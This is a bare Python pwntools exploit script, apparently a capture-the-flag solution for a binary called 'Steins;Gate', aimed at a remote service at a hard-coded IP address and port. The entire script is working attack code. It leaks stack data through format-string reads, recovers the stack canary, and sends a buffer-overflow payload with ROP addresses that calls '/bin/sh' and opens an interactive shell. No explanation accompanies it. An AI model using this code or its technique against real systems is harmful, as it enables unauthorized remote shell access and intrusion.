from pwn import *
#context.log_level = "debug"
#p = process("./Steins;Gate")
p = remote('118.24.3.214', 10002)
p.recvuntil("ID:")
d = 0x602040
p.sendline("/bin/sh\x00")
p.recvuntil("world.\n")
payload = "f"*0x30
payload += "\x33\x23"
p.send(payload)
p.recvuntil("man.\n")

p.send("%7$p")
i = int(p.recv(numb=10),16) + 0x1234
p.recvuntil("it?\n")
p.send("f"*0x1c + p32(0x6666) + "f" * 0x10 +p32(i))
p.recvuntil("debts.\n")
p.send("%11$p")
canary = int(p.recv(numb=18),16)
success("canary ===> " + hex(canary))
p.recvuntil("world.\n")
payload = 0x30 * "a"
payload += "\x33\x23"
payload = payload.ljust(0x38,"\x00")
payload += p64(canary)
payload += p64(0x00)
payload += p64(0x400c73)
payload += p64(d)
payload += p64(0x400A89)
p.send(payload)


p.interactive()
